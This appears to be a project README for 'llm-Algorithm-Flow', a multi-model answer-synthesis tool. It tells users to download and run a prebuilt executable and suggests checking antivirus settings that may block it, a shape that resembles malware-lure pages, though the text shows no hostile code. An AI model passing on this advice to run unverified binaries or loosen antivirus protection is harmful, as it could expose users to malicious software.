## üöÄ Getting Started
Welcome to the **llm-Algorithm-Flow** project! This guide will help you download and run the application easily. This tool allows you to leverage multiple language models to solve complex problems by working together.

### üìã Requirements
Before using the application, ensure you have the following:

- A computer running Windows, macOS, or Linux.
- At least 4 GB of RAM for smooth operation.
- An internet connection for downloading the application and model data.

## üõ†Ô∏è Installation Steps

### 1. Visit the Release Page
To get the latest version of the application, visit this page: [Download Page](https://github.com/varunmylom/llm-Algorithm-Flow/releases).

### 2. Download the Application
On the releases page, you'll see a list of available versions. Click on the version number you want to download. Look for the file named `llm-Algorithm-Flow.exe` (if on Windows) or `llm-Algorithm-Flow.dmg` (if on macOS).

### 3. Run the Installer
Once the download is complete, run the installer. Follow the on-screen prompts to complete the installation process. If you are on Linux, open your terminal and navigate to the downloaded file. Use this command to install:

```bash
chmod +x llm-Algorithm-Flow
./llm-Algorithm-Flow
```

### 4. Launch the Application
After installation, you can find the application in your programs list or on your desktop. Double-click the icon to start.

## ‚öôÔ∏è How It Works
The application uses a system of multiple language models to solve problems. Here‚Äôs a quick overview of the algorithm flow:

1. **Start**: The application begins its process.
2. **Get Model Responses**: It collects responses from different models.
3. **Synthesize Responses**: It combines these responses into a single output.
4. **Check Confidence**: It evaluates how confident the combined response is.
5. **Return Final Result**: If the confidence meets a certain threshold, you receive the final solution.

### üîç Features
- **Multi-Model Collaboration**: Uses various models for better accuracy.
- **Iterative Refinement**: Improves answers by processing and re-evaluating responses.
- **User-Friendly Interface**: Designed for easy navigation and use.

### ‚ö†Ô∏è Troubleshooting
If you encounter any issues during installation or when running the application, consider the following tips:

- Ensure your system meets the requirements.
- Make sure the file downloaded completely before running.
- Check for any antivirus or firewall settings that may block the application.
